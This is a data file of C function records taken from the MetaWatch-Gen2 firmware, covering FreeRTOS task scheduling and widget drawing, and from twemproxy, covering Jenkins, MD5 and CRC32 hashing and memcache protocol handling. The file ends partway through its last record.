{"docstring": "// FaceId???\n", "func_signal": "void DrawClockToSram(unsigned char Id)", "code": "{\n  unsigned char i;\n\n//  PrintF(\"-ClkSrm:%02X\", Id);\n  for (i = 0; pCurrWidgetList[i].Id != INVALID_ID && i < MAX_WIDGET_NUM; ++i)\n  {\n    if (!IS_CLOCK_WIDGET(pCurrWidgetList[i].Layout)) continue;\n    \n    if (OnCurrentPage(pCurrWidgetList[i].Layout))\n    {\n      if (CLOCK_ID(pCurrWidgetList[i].Id) == Id)\n      {\n        WriteWidget(i);\n        break;\n      }\n    }\n  }\n\n//  PrintF(\"-%04X clk)\", pClkBuf);\n  vPortFree(pClkBuf);\n  pClkBuf = NULL;\n}", "path": "Watch\\Application\\Widget.c", "repo_name": "MetaWatchOpenProjects/MetaWatch-Gen2", "stars": 150, "license": "None", "language": "c", "size": 48260}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "portBASE_TYPE xTaskCheckForTimeOut( xTimeOutType * const pxTimeOut, portTickType * const pxTicksToWait )", "code": "{\nportBASE_TYPE xReturn;\n\n\tportENTER_CRITICAL();\n\t{\n\t\t#if ( INCLUDE_vTaskSuspend == 1 )\n\t\t\t/* If INCLUDE_vTaskSuspend is set to 1 and the block time specified is\n\t\t\tthe maximum block time then the task should block indefinitely, and\n\t\t\ttherefore never time out. */\n\t\t\tif( *pxTicksToWait == portMAX_DELAY )\n\t\t\t{\n\t\t\t\txReturn = pdFALSE;\n\t\t\t}\n\t\t\telse /* We are not blocking indefinitely, perform the checks below. */\n\t\t#endif\n\n\t\tif( ( xNumOfOverflows != pxTimeOut->xOverflowCount ) && ( ( portTickType ) xTickCount >= ( portTickType ) pxTimeOut->xTimeOnEntering ) )\n\t\t{\n\t\t\t/* The tick count is greater than the time at which vTaskSetTimeout()\n\t\t\twas called, but has also overflowed since vTaskSetTimeOut() was called.\n\t\t\tIt must have wrapped all the way around and gone past us again. This\n\t\t\tpassed since vTaskSetTimeout() was called. */\n\t\t\txReturn = pdTRUE;\n\t\t}\n\t\telse if( ( ( portTickType ) ( ( portTickType ) xTickCount - ( portTickType ) pxTimeOut->xTimeOnEntering ) ) < ( portTickType ) *pxTicksToWait )\n\t\t{\n\t\t\t/* Not a genuine timeout. Adjust parameters for time remaining. */\n\t\t\t*pxTicksToWait -= ( ( portTickType ) xTickCount - ( portTickType ) pxTimeOut->xTimeOnEntering );\n\t\t\tvTaskSetTimeOutState( pxTimeOut );\n\t\t\txReturn = pdFALSE;\n\t\t}\n\t\telse\n\t\t{\n\t\t\txReturn = pdTRUE;\n\t\t}\n\t}\n\tportEXIT_CRITICAL();\n\n\treturn xReturn;\n}", "path": "FreeRTOS\\tasks.c", "repo_name": "MetaWatchOpenProjects/MetaWatch-Gen2", "stars": 150, "license": "None", "language": "c", "size": 48260}
{"docstring": "/*-----------------------------------------------------------\n * PUBLIC TASK UTILITIES documented in task.h\n *----------------------------------------------------------*/\n", "func_signal": "portTickType xTaskGetTickCount( void )", "code": "{\nportTickType xTicks;\n\n\t/* Critical section required if running on a 16 bit processor. */\n\tportENTER_CRITICAL();\n\t{\n\t\txTicks = xTickCount;\n\t}\n\tportEXIT_CRITICAL();\n\n\treturn xTicks;\n}", "path": "FreeRTOS\\tasks.c", "repo_name": "MetaWatchOpenProjects/MetaWatch-Gen2", "stars": 150, "license": "None", "language": "c", "size": 48260}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "void vTaskEndScheduler( void )", "code": "{\n\t/* Stop the scheduler interrupts and call the portable scheduler end\n\troutine so the original ISRs can be restored if necessary.  The port\n\tlayer must ensure interrupts enable\tbit is left in the correct state. */\n\t__disable_interrupt();\n  __no_operation();\n  xSchedulerRunning = pdFALSE;\n\tvPortEndScheduler();\n}", "path": "FreeRTOS\\tasks.c", "repo_name": "MetaWatchOpenProjects/MetaWatch-Gen2", "stars": 150, "license": "None", "language": "c", "size": 48260}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "void vTaskPlaceOnEventList( const xList * const pxEventList, portTickType xTicksToWait )", "code": "{\nportTickType xTimeToWake;\n\n\t/* THIS FUNCTION MUST BE CALLED WITH INTERRUPTS DISABLED OR THE\n\tSCHEDULER SUSPENDED. */\n\n\t/* Place the event list item of the TCB in the appropriate event list.\n\tThis is placed in the list in priority order so the highest priority task\n\tis the first to be woken by the event. */\n\tvListInsert( ( xList * ) pxEventList, ( xListItem * ) &( pxCurrentTCB->xEventListItem ) );\n\n\t/* We must remove ourselves from the ready list before adding ourselves\n\tto the blocked list as the same list item is used for both lists.  We have\n\texclusive access to the ready lists as the scheduler is locked. */\n\tvListRemove( ( xListItem * ) &( pxCurrentTCB->xGenericListItem ) );\n\n\n\t#if ( INCLUDE_vTaskSuspend == 1 )\n\t{\n\t\tif( xTicksToWait == portMAX_DELAY )\n\t\t{\n\t\t\t/* Add ourselves to the suspended task list instead of a delayed task\n\t\t\tlist to ensure we are not woken by a timing event.  We will block\n\t\t\tindefinitely. */\n\t\t\tvListInsertEnd( ( xList * ) &xSuspendedTaskList, ( xListItem * ) &( pxCurrentTCB->xGenericListItem ) );\n\t\t}\n\t\telse\n\t\t{\n\t\t\t/* Calculate the time at which the task should be woken if the event does\n\t\t\tnot occur.  This may overflow but this doesn't matter. */\n\t\t\txTimeToWake = xTickCount + xTicksToWait;\n\n\t\t\tlistSET_LIST_ITEM_VALUE( &( pxCurrentTCB->xGenericListItem ), xTimeToWake );\n\n#ifdef __IAR_SYSTEMS_ICC__\n#pragma diag_suppress=Pa082 /* ignore order of volatile access warning */\n#endif\n\t\t\tif( xTimeToWake < xTickCount )\n\t\t\t{\n\t\t\t\t/* Wake time has overflowed.  Place this item in the overflow list. */\n\t\t\t\tvListInsert( ( xList * ) pxOverflowDelayedTaskList, ( xListItem * ) &( pxCurrentTCB->xGenericListItem ) );\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\t/* The wake time has not overflowed, so we can use the current block list. */\n\t\t\t\tvListInsert( ( xList * ) pxDelayedTaskList, ( xListItem * ) &( pxCurrentTCB->xGenericListItem ) );\n\t\t\t}\n#ifdef __IAR_SYSTEMS_ICC__\n#pragma diag_default=Pa082\n#endif\n\t\t}\n\t}\n\t#else\n\t{\n\t\t\t/* Calculate the time at which the task should be woken if the event does\n\t\t\tnot occur.  This may overflow but this doesn't matter. */\n\t\t\txTimeToWake = xTickCount + xTicksToWait;\n\n\t\t\tlistSET_LIST_ITEM_VALUE( &( pxCurrentTCB->xGenericListItem ), xTimeToWake );\n\n\t\t\tif( xTimeToWake < xTickCount )\n\t\t\t{\n\t\t\t\t/* Wake time has overflowed.  Place this item in the overflow list. */\n\t\t\t\tvListInsert( ( xList * ) pxOverflowDelayedTaskList, ( xListItem * ) &( pxCurrentTCB->xGenericListItem ) );\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\t/* The wake time has not overflowed, so we can use the current block list. */\n\t\t\t\tvListInsert( ( xList * ) pxDelayedTaskList, ( xListItem * ) &( pxCurrentTCB->xGenericListItem ) );\n\t\t\t}\n\t}\n\t#endif\n}", "path": "FreeRTOS\\tasks.c", "repo_name": "MetaWatchOpenProjects/MetaWatch-Gen2", "stars": 150, "license": "None", "language": "c", "size": 48260}
{"docstring": "/*! todo - this doesn't check that the radio supports low energy\n * just that the patch selection does\n */\n", "func_signal": "unsigned char QuerySupportLowEnergy(void)", "code": "{\n  unsigned char result = 0;\n\n  if ( RadioVersion == RadioVersionCC2564 )\n  {\n#if INCLUDE_1316_PATCH && defined(SUPPORT_BLE)\n    result = 1;\n#endif\n  }    \n  return result;\n}", "path": "Patch\\PatchSelection.c", "repo_name": "MetaWatchOpenProjects/MetaWatch-Gen2", "stars": 150, "license": "None", "language": "c", "size": 48260}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "static void prvCheckTasksWaitingTermination( void )", "code": "{\n\t#if ( INCLUDE_vTaskDelete == 1 )\n\t{\n\t\tportBASE_TYPE xListIsEmpty;\n\n\t\t/* ucTasksDeleted is used to prevent vTaskSuspendAll() being called\n\t\ttoo often in the idle task. */\n\t\tif( uxTasksDeleted > ( unsigned portBASE_TYPE ) 0 )\n\t\t{\n\t\t\tvTaskSuspendAll();\n\t\t\t\txListIsEmpty = listLIST_IS_EMPTY( &xTasksWaitingTermination );\n\t\t\txTaskResumeAll();\n\n\t\t\tif( !xListIsEmpty )\n\t\t\t{\n\t\t\t\ttskTCB *pxTCB;\n\n\t\t\t\tportENTER_CRITICAL();\n\t\t\t\t{\n\t\t\t\t\tpxTCB = ( tskTCB * ) listGET_OWNER_OF_HEAD_ENTRY( ( ( xList * ) &xTasksWaitingTermination ) );\n\t\t\t\t\tvListRemove( &( pxTCB->xGenericListItem ) );\n\t\t\t\t\t--uxCurrentNumberOfTasks;\n\t\t\t\t\t--uxTasksDeleted;\n\t\t\t\t}\n\t\t\t\tportEXIT_CRITICAL();\n\n\t\t\t\tprvDeleteTCB( pxTCB );\n\t\t\t}\n\t\t}\n\t}\n\t#endif\n}", "path": "FreeRTOS\\tasks.c", "repo_name": "MetaWatchOpenProjects/MetaWatch-Gen2", "stars": 150, "license": "None", "language": "c", "size": 48260}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "signed portBASE_TYPE xTaskTickRequired( void )", "code": "{\n  if( !listLIST_IS_EMPTY( pxDelayedTaskList ) ) return pdTRUE;\n  if( !listLIST_IS_EMPTY( pxOverflowDelayedTaskList ) ) return pdTRUE;\n\n  return pdFALSE;\n}", "path": "FreeRTOS\\tasks.c", "repo_name": "MetaWatchOpenProjects/MetaWatch-Gen2", "stars": 150, "license": "None", "language": "c", "size": 48260}
{"docstring": "/*----------------------------------------------------------*/\n", "func_signal": "signed portBASE_TYPE xTaskResumeAll( void )", "code": "{\nregister tskTCB *pxTCB;\nsigned portBASE_TYPE xAlreadyYielded = pdFALSE;\n\n\t/* It is possible that an ISR caused a task to be removed from an event\n\tlist while the scheduler was suspended.  If this was the case then the\n\tremoved task will have been added to the xPendingReadyList.  Once the\n\tscheduler has been resumed it is safe to move all the pending ready\n\ttasks from this list into their appropriate ready list. */\n\tportENTER_CRITICAL();\n\t{\n\t\t--uxSchedulerSuspended;\n\n\t\tif( uxSchedulerSuspended == ( unsigned portBASE_TYPE ) pdFALSE )\n\t\t{\n\t\t\tif( uxCurrentNumberOfTasks > ( unsigned portBASE_TYPE ) 0 )\n\t\t\t{\n\t\t\t\tportBASE_TYPE xYieldRequired = pdFALSE;\n\n\t\t\t\t/* Move any readied tasks from the pending list into the\n\t\t\t\tappropriate ready list. */\n\t\t\t\twhile( ( pxTCB = ( tskTCB * ) listGET_OWNER_OF_HEAD_ENTRY(  ( ( xList * ) &xPendingReadyList ) ) ) != NULL )\n\t\t\t\t{\n\t\t\t\t\tvListRemove( &( pxTCB->xEventListItem ) );\n\t\t\t\t\tvListRemove( &( pxTCB->xGenericListItem ) );\n\t\t\t\t\tprvAddTaskToReadyQueue( pxTCB );\n\n\t\t\t\t\t/* If we have moved a task that has a priority higher than\n\t\t\t\t\tthe current task then we should yield. */\n\t\t\t\t\tif( pxTCB->uxPriority >= pxCurrentTCB->uxPriority )\n\t\t\t\t\t{\n\t\t\t\t\t\txYieldRequired = pdTRUE;\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t/* If any ticks occurred while the scheduler was suspended then\n\t\t\t\tthey should be processed now.  This ensures the tick count does not\n\t\t\t\tslip, and that any delayed tasks are resumed at the correct time. */\n\t\t\t\tif( uxMissedTicks > ( unsigned portBASE_TYPE ) 0 )\n\t\t\t\t{\n\t\t\t\t\twhile( uxMissedTicks > ( unsigned portBASE_TYPE ) 0 )\n\t\t\t\t\t{\n\t\t\t\t\t\tvTaskIncrementTick();\n\t\t\t\t\t\t--uxMissedTicks;\n\t\t\t\t\t}\n\n\t\t\t\t\t/* As we have processed some ticks it is appropriate to yield\n\t\t\t\t\tto ensure the highest priority task that is ready to run is\n\t\t\t\t\tthe task actually running. */\n\t\t\t\t\t#if configUSE_PREEMPTION == 1\n\t\t\t\t\t{\n\t\t\t\t\t\txYieldRequired = pdTRUE;\n\t\t\t\t\t}\n\t\t\t\t\t#endif\n\t\t\t\t}\n\n\t\t\t\tif( ( xYieldRequired == pdTRUE ) || ( xMissedYield == pdTRUE ) )\n\t\t\t\t{\n\t\t\t\t\txAlreadyYielded = pdTRUE;\n\t\t\t\t\txMissedYield = pdFALSE;\n\t\t\t\t\tportYIELD_WITHIN_API();\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tportEXIT_CRITICAL();\n\n\treturn xAlreadyYielded;\n}", "path": "FreeRTOS\\tasks.c", "repo_name": "MetaWatchOpenProjects/MetaWatch-Gen2", "stars": 150, "license": "None", "language": "c", "size": 48260}
{"docstring": "/*-----------------------------------------------------------\n * File private functions documented at the top of the file.\n *----------------------------------------------------------*/\n", "func_signal": "static void prvInitialiseTCBVariables( tskTCB *pxTCB, const signed char * const pcName, unsigned portBASE_TYPE uxPriority, const xMemoryRegion * const xRegions, unsigned short usStackDepth )", "code": "{\n\t/* Store the function name in the TCB. */\n\t#if configMAX_TASK_NAME_LEN > 1\n\t{\n\t\t/* Don't bring strncpy into the build unnecessarily. */\n\t\tstrncpy( ( char * ) pxTCB->pcTaskName, ( const char * ) pcName, ( unsigned short ) configMAX_TASK_NAME_LEN );\n\t}\n\t#endif\n\tpxTCB->pcTaskName[ ( unsigned short ) configMAX_TASK_NAME_LEN - ( unsigned short ) 1 ] = '\\0';\n\n\t/* This is used as an array index so must ensure it's not too large.  First\n\tremove the privilege bit if one is present. */\n\tif( uxPriority >= configMAX_PRIORITIES )\n\t{\n\t\tuxPriority = configMAX_PRIORITIES - 1;\n\t}\n\n\tpxTCB->uxPriority = uxPriority;\n\t#if ( configUSE_MUTEXES == 1 )\n\t{\n\t\tpxTCB->uxBasePriority = uxPriority;\n\t}\n\t#endif\n\n\tvListInitialiseItem( &( pxTCB->xGenericListItem ) );\n\tvListInitialiseItem( &( pxTCB->xEventListItem ) );\n\n\t/* Set the pxTCB as a link back from the xListItem.  This is so we can get\n\tback to\tthe containing TCB from a generic item in a list. */\n\tlistSET_LIST_ITEM_OWNER( &( pxTCB->xGenericListItem ), pxTCB );\n\n\t/* Event lists are always in priority order. */\n\tlistSET_LIST_ITEM_VALUE( &( pxTCB->xEventListItem ), configMAX_PRIORITIES - ( portTickType ) uxPriority );\n\tlistSET_LIST_ITEM_OWNER( &( pxTCB->xEventListItem ), pxTCB );\n\n\t#if ( portCRITICAL_NESTING_IN_TCB == 1 )\n\t{\n\t\tpxTCB->uxCriticalNesting = ( unsigned portBASE_TYPE ) 0;\n\t}\n\t#endif\n\n\t#if ( configUSE_APPLICATION_TASK_TAG == 1 )\n\t{\n\t\tpxTCB->pxTaskTag = NULL;\n\t}\n\t#endif\n\n\t#if ( configGENERATE_RUN_TIME_STATS == 1 )\n\t{\n\t\tpxTCB->ulRunTimeCounter = 0UL;\n\t}\n\t#endif\n\n\t#if ( portUSING_MPU_WRAPPERS == 1 )\n\t{\n\t\tvPortStoreTaskMPUSettings( &( pxTCB->xMPUSettings ), xRegions, pxTCB->pxStack, usStackDepth );\n\t}\n\t#else\n\t{\n\t\t( void ) xRegions;\n\t\t( void ) usStackDepth;\n\t}\n\t#endif\n}", "path": "FreeRTOS\\tasks.c", "repo_name": "MetaWatchOpenProjects/MetaWatch-Gen2", "stars": 150, "license": "None", "language": "c", "size": 48260}
{"docstring": "/*\n * jenkins_hash() -- hash a variable-length key into a 32-bit value\n *  k       : the key (the unaligned variable-length array of bytes)\n *  length  : the length of the key, counting by bytes\n *  initval : can be any 4-byte value\n * Returns a 32-bit value.  Every bit of the key affects every bit of\n * the return value.  Two keys differing by one or two bits will have\n * totally different hash values.\n\n * The best hash table sizes are powers of 2.  There is no need to do\n * mod a prime (mod is sooo slow!).  If you need less than 32 bits,\n * use a bitmask.  For example, if you need only 10 bits, do\n *   h = (h & hashmask(10));\n * In which case, the hash table should have hashsize(10) elements.\n */\n", "func_signal": "uint32_t\nhash_jenkins(const char *key, size_t length)", "code": "{\n  uint32_t a,b,c;                                          /* internal state */\n  union { const void *ptr; size_t i; } u;     /* needed for Mac Powerbook G4 */\n\n  /* Set up the internal state */\n  a = b = c = 0xdeadbeef + ((uint32_t)length) + JENKINS_INITVAL;\n\n  u.ptr = key;\n#ifndef WORDS_BIGENDIAN\n  if ((u.i & 0x3) == 0)\n  {\n    const uint32_t *k = (const uint32_t *)key;         /* read 32-bit chunks */\n\n    /*------ all but last block: aligned reads and affect 32 bits of (a,b,c) */\n    while (length > 12)\n    {\n      a += k[0];\n      b += k[1];\n      c += k[2];\n      mix(a,b,c);\n      length -= 12;\n      k += 3;\n    }\n\n    /*----------------------------- handle the last (probably partial) block */\n    /*\n     * \"k[2]&0xffffff\" actually reads beyond the end of the string, but\n     * then masks off the part it's not allowed to read.  Because the\n     * string is aligned, the masked-off tail is in the same word as the\n     * rest of the string.  Every machine with memory protection I've seen\n     * does it on word boundaries, so is OK with this.  But VALGRIND will\n     * still catch it and complain.  The masking trick does make the hash\n     * noticeably faster for short strings (like English words).\n     */\n    switch(length)\n    {\n    case 12: c+=k[2]; b+=k[1]; a+=k[0]; break;\n    case 11: c+=k[2]&0xffffff; b+=k[1]; a+=k[0]; break;\n    case 10: c+=k[2]&0xffff; b+=k[1]; a+=k[0]; break;\n    case 9 : c+=k[2]&0xff; b+=k[1]; a+=k[0]; break;\n    case 8 : b+=k[1]; a+=k[0]; break;\n    case 7 : b+=k[1]&0xffffff; a+=k[0]; break;\n    case 6 : b+=k[1]&0xffff; a+=k[0]; break;\n    case 5 : b+=k[1]&0xff; a+=k[0]; break;\n    case 4 : a+=k[0]; break;\n    case 3 : a+=k[0]&0xffffff; break;\n    case 2 : a+=k[0]&0xffff; break;\n    case 1 : a+=k[0]&0xff; break;\n    case 0 : return c;              /* zero length strings require no mixing */\n    default: return c;\n    }\n\n  }\n  else if ((u.i & 0x1) == 0)\n  {\n    const uint16_t *k = (const uint16_t *)key;         /* read 16-bit chunks */\n    const uint8_t  *k8;\n\n    /*--------------- all but last block: aligned reads and different mixing */\n    while (length > 12)\n    {\n      a += k[0] + (((uint32_t)k[1])<<16);\n      b += k[2] + (((uint32_t)k[3])<<16);\n      c += k[4] + (((uint32_t)k[5])<<16);\n      mix(a,b,c);\n      length -= 12;\n      k += 6;\n    }\n\n    /*----------------------------- handle the last (probably partial) block */\n    k8 = (const uint8_t *)k;\n    switch(length)\n    {\n    case 12: c+=k[4]+(((uint32_t)k[5])<<16);\n             b+=k[2]+(((uint32_t)k[3])<<16);\n             a+=k[0]+(((uint32_t)k[1])<<16);\n             break;\n    case 11: c+=((uint32_t)k8[10])<<16;     /* fall through */\n    case 10: c+=k[4];\n             b+=k[2]+(((uint32_t)k[3])<<16);\n             a+=k[0]+(((uint32_t)k[1])<<16);\n             break;\n    case 9 : c+=k8[8];                      /* fall through */\n    case 8 : b+=k[2]+(((uint32_t)k[3])<<16);\n             a+=k[0]+(((uint32_t)k[1])<<16);\n             break;\n    case 7 : b+=((uint32_t)k8[6])<<16;      /* fall through */\n    case 6 : b+=k[2];\n             a+=k[0]+(((uint32_t)k[1])<<16);\n             break;\n    case 5 : b+=k8[4];                      /* fall through */\n    case 4 : a+=k[0]+(((uint32_t)k[1])<<16);\n             break;\n    case 3 : a+=((uint32_t)k8[2])<<16;      /* fall through */\n    case 2 : a+=k[0];\n             break;\n    case 1 : a+=k8[0];\n             break;\n    case 0 : return c;                     /* zero length requires no mixing */\n    default: return c;\n    }\n\n  }\n  else\n  {                        /* need to read the key one byte at a time */\n#endif /* little endian */\n    const uint8_t *k = (const uint8_t *)key;\n\n    /*--------------- all but the last block: affect some 32 bits of (a,b,c) */\n    while (length > 12)\n    {\n      a += k[0];\n      a += ((uint32_t)k[1])<<8;\n      a += ((uint32_t)k[2])<<16;\n      a += ((uint32_t)k[3])<<24;\n      b += k[4];\n      b += ((uint32_t)k[5])<<8;\n      b += ((uint32_t)k[6])<<16;\n      b += ((uint32_t)k[7])<<24;\n      c += k[8];\n      c += ((uint32_t)k[9])<<8;\n      c += ((uint32_t)k[10])<<16;\n      c += ((uint32_t)k[11])<<24;\n      mix(a,b,c);\n      length -= 12;\n      k += 12;\n    }\n\n    /*-------------------------------- last block: affect all 32 bits of (c) */\n    switch(length)                   /* all the case statements fall through */\n    {\n    case 12: c+=((uint32_t)k[11])<<24;\n    case 11: c+=((uint32_t)k[10])<<16;\n    case 10: c+=((uint32_t)k[9])<<8;\n    case 9 : c+=k[8];\n    case 8 : b+=((uint32_t)k[7])<<24;\n    case 7 : b+=((uint32_t)k[6])<<16;\n    case 6 : b+=((uint32_t)k[5])<<8;\n    case 5 : b+=k[4];\n    case 4 : a+=((uint32_t)k[3])<<24;\n    case 3 : a+=((uint32_t)k[2])<<16;\n    case 2 : a+=((uint32_t)k[1])<<8;\n    case 1 : a+=k[0];\n             break;\n    case 0 : return c;\n    default : return c;\n    }\n#ifndef WORDS_BIGENDIAN\n  }\n#endif\n\n  final(a,b,c);\n  return c;\n}", "path": "src\\hashkit\\nc_jenkins.c", "repo_name": "bitleak/twemproxy", "stars": 158, "license": "apache-2.0", "language": "c", "size": 2152}
{"docstring": "/*\n * This processes one or more 64-byte data blocks, but does NOT update\n * the bit counters.  There are no alignment requirements.\n */\n", "func_signal": "static void *\nbody(MD5_CTX *ctx, void *data, unsigned long size)", "code": "{\n    unsigned char *ptr;\n    MD5_u32plus a, b, c, d;\n    MD5_u32plus saved_a, saved_b, saved_c, saved_d;\n\n    ptr = data;\n\n    a = ctx->a;\n    b = ctx->b;\n    c = ctx->c;\n    d = ctx->d;\n\n\tdo {\n        saved_a = a;\n        saved_b = b;\n        saved_c = c;\n        saved_d = d;\n\n        /* Round 1 */\n        STEP(F, a, b, c, d, SET(0), 0xd76aa478, 7)\n        STEP(F, d, a, b, c, SET(1), 0xe8c7b756, 12)\n        STEP(F, c, d, a, b, SET(2), 0x242070db, 17)\n        STEP(F, b, c, d, a, SET(3), 0xc1bdceee, 22)\n        STEP(F, a, b, c, d, SET(4), 0xf57c0faf, 7)\n        STEP(F, d, a, b, c, SET(5), 0x4787c62a, 12)\n        STEP(F, c, d, a, b, SET(6), 0xa8304613, 17)\n        STEP(F, b, c, d, a, SET(7), 0xfd469501, 22)\n        STEP(F, a, b, c, d, SET(8), 0x698098d8, 7)\n        STEP(F, d, a, b, c, SET(9), 0x8b44f7af, 12)\n        STEP(F, c, d, a, b, SET(10), 0xffff5bb1, 17)\n        STEP(F, b, c, d, a, SET(11), 0x895cd7be, 22)\n        STEP(F, a, b, c, d, SET(12), 0x6b901122, 7)\n        STEP(F, d, a, b, c, SET(13), 0xfd987193, 12)\n        STEP(F, c, d, a, b, SET(14), 0xa679438e, 17)\n        STEP(F, b, c, d, a, SET(15), 0x49b40821, 22)\n\n        /* Round 2 */\n        STEP(G, a, b, c, d, GET(1), 0xf61e2562, 5)\n        STEP(G, d, a, b, c, GET(6), 0xc040b340, 9)\n        STEP(G, c, d, a, b, GET(11), 0x265e5a51, 14)\n        STEP(G, b, c, d, a, GET(0), 0xe9b6c7aa, 20)\n        STEP(G, a, b, c, d, GET(5), 0xd62f105d, 5)\n        STEP(G, d, a, b, c, GET(10), 0x02441453, 9)\n        STEP(G, c, d, a, b, GET(15), 0xd8a1e681, 14)\n        STEP(G, b, c, d, a, GET(4), 0xe7d3fbc8, 20)\n        STEP(G, a, b, c, d, GET(9), 0x21e1cde6, 5)\n        STEP(G, d, a, b, c, GET(14), 0xc33707d6, 9)\n        STEP(G, c, d, a, b, GET(3), 0xf4d50d87, 14)\n        STEP(G, b, c, d, a, GET(8), 0x455a14ed, 20)\n        STEP(G, a, b, c, d, GET(13), 0xa9e3e905, 5)\n        STEP(G, d, a, b, c, GET(2), 0xfcefa3f8, 9)\n        STEP(G, c, d, a, b, GET(7), 0x676f02d9, 14)\n        STEP(G, b, c, d, a, GET(12), 0x8d2a4c8a, 20)\n\n        /* Round 3 */\n        STEP(H, a, b, c, d, GET(5), 0xfffa3942, 4)\n        STEP(H, d, a, b, c, GET(8), 0x8771f681, 11)\n        STEP(H, c, d, a, b, GET(11), 0x6d9d6122, 16)\n        STEP(H, b, c, d, a, GET(14), 0xfde5380c, 23)\n        STEP(H, a, b, c, d, GET(1), 0xa4beea44, 4)\n        STEP(H, d, a, b, c, GET(4), 0x4bdecfa9, 11)\n        STEP(H, c, d, a, b, GET(7), 0xf6bb4b60, 16)\n        STEP(H, b, c, d, a, GET(10), 0xbebfbc70, 23)\n        STEP(H, a, b, c, d, GET(13), 0x289b7ec6, 4)\n        STEP(H, d, a, b, c, GET(0), 0xeaa127fa, 11)\n        STEP(H, c, d, a, b, GET(3), 0xd4ef3085, 16)\n        STEP(H, b, c, d, a, GET(6), 0x04881d05, 23)\n        STEP(H, a, b, c, d, GET(9), 0xd9d4d039, 4)\n        STEP(H, d, a, b, c, GET(12), 0xe6db99e5, 11)\n        STEP(H, c, d, a, b, GET(15), 0x1fa27cf8, 16)\n        STEP(H, b, c, d, a, GET(2), 0xc4ac5665, 23)\n\n        /* Round 4 */\n        STEP(I, a, b, c, d, GET(0), 0xf4292244, 6)\n        STEP(I, d, a, b, c, GET(7), 0x432aff97, 10)\n        STEP(I, c, d, a, b, GET(14), 0xab9423a7, 15)\n        STEP(I, b, c, d, a, GET(5), 0xfc93a039, 21)\n        STEP(I, a, b, c, d, GET(12), 0x655b59c3, 6)\n        STEP(I, d, a, b, c, GET(3), 0x8f0ccc92, 10)\n        STEP(I, c, d, a, b, GET(10), 0xffeff47d, 15)\n        STEP(I, b, c, d, a, GET(1), 0x85845dd1, 21)\n        STEP(I, a, b, c, d, GET(8), 0x6fa87e4f, 6)\n        STEP(I, d, a, b, c, GET(15), 0xfe2ce6e0, 10)\n        STEP(I, c, d, a, b, GET(6), 0xa3014314, 15)\n        STEP(I, b, c, d, a, GET(13), 0x4e0811a1, 21)\n        STEP(I, a, b, c, d, GET(4), 0xf7537e82, 6)\n        STEP(I, d, a, b, c, GET(11), 0xbd3af235, 10)\n        STEP(I, c, d, a, b, GET(2), 0x2ad7d2bb, 15)\n        STEP(I, b, c, d, a, GET(9), 0xeb86d391, 21)\n\n        a += saved_a;\n        b += saved_b;\n        c += saved_c;\n        d += saved_d;\n\n        ptr += 64;\n    } while (size -= 64);\n\n    ctx->a = a;\n    ctx->b = b;\n    ctx->c = c;\n    ctx->d = d;\n\n    return ptr;\n}", "path": "src\\hashkit\\nc_md5.c", "repo_name": "bitleak/twemproxy", "stars": 158, "license": "apache-2.0", "language": "c", "size": 2152}
{"docstring": "/*\n * CRC-32 implementation compatible with libmemcached library. Unfortunately\n * this implementation does not return CRC-32 as per spec.\n */\n", "func_signal": "uint32_t\nhash_crc32(const char *key, size_t key_length)", "code": "{\n    uint64_t x;\n    uint32_t crc = UINT32_MAX;\n\n    for (x = 0; x < key_length; x++) {\n        crc = (crc >> 8) ^ crc32tab[(crc ^ (uint64_t)key[x]) & 0xff];\n    }\n\n    return ((~crc) >> 16) & 0x7fff;\n}", "path": "src\\hashkit\\nc_crc32.c", "repo_name": "bitleak/twemproxy", "stars": 158, "license": "apache-2.0", "language": "c", "size": 2152}
{"docstring": "/*\n * Return true, if the memcache command is a delete command, otherwise\n * return false\n */\n", "func_signal": "static bool\nmemcache_delete(struct msg *r)", "code": "{\n    if (r->type == MSG_REQ_MC_DELETE) {\n        return true;\n    }\n\n    return false;\n}", "path": "src\\proto\\nc_memcache.c", "repo_name": "bitleak/twemproxy", "stars": 158, "license": "apache-2.0", "language": "c", "size": 2152}
{"docstring": "/*\n * Pre-coalesce handler is invoked when the message is a response to\n * the fragmented multi vector request - 'get' or 'gets' and all the\n * responses to the fragmented request vector hasn't been received\n */\n", "func_signal": "void\nmemcache_pre_coalesce(struct msg *r)", "code": "{\n    struct msg *pr = r->peer; /* peer request */\n    struct mbuf *mbuf;\n\n    ASSERT(!r->request);\n    ASSERT(pr->request);\n\n    if (pr->frag_id == 0) {\n        /* do nothing, if not a response to a fragmented request */\n        return;\n    }\n\n    pr->frag_owner->nfrag_done++;\n    switch (r->type) {\n\n    case MSG_RSP_MC_VALUE:\n    case MSG_RSP_MC_END:\n\n        /*\n         * Readjust responses of the fragmented message vector by not\n         * including the end marker for all\n         */\n\n        ASSERT(r->end != NULL);\n\n        for (;;) {\n            mbuf = STAILQ_LAST(&r->mhdr, mbuf, next);\n            ASSERT(mbuf != NULL);\n\n            /*\n             * We cannot assert that end marker points to the last mbuf\n             * Consider a scenario where end marker points to the\n             * penultimate mbuf and the last mbuf only contains spaces\n             * and CRLF: mhdr -> [...END] -> [\\r\\n]\n             */\n\n            if (r->end >= mbuf->pos && r->end < mbuf->last) {\n                /* end marker is within this mbuf */\n                r->mlen -= (uint32_t)(mbuf->last - r->end);\n                mbuf->last = r->end;\n                break;\n            }\n\n            /* end marker is not in this mbuf */\n            r->mlen -= mbuf_length(mbuf);\n            mbuf_remove(&r->mhdr, mbuf);\n            mbuf_put(mbuf);\n        }\n\n        break;\n\n    default:\n        /*\n         * Valid responses for a fragmented requests are MSG_RSP_MC_VALUE or,\n         * MSG_RSP_MC_END. For an invalid response, we send out SERVER_ERRROR\n         * with EINVAL errno\n         */\n        mbuf = STAILQ_FIRST(&r->mhdr);\n        log_hexdump(LOG_ERR, mbuf->pos, mbuf_length(mbuf), \"rsp fragment \"\n                    \"with unknown type %d\", r->type);\n        pr->error = 1;\n        pr->err = EINVAL;\n        break;\n    }\n}", "path": "src\\proto\\nc_memcache.c", "repo_name": "bitleak/twemproxy", "stars": 158, "license": "apache-2.0", "language": "c", "size": 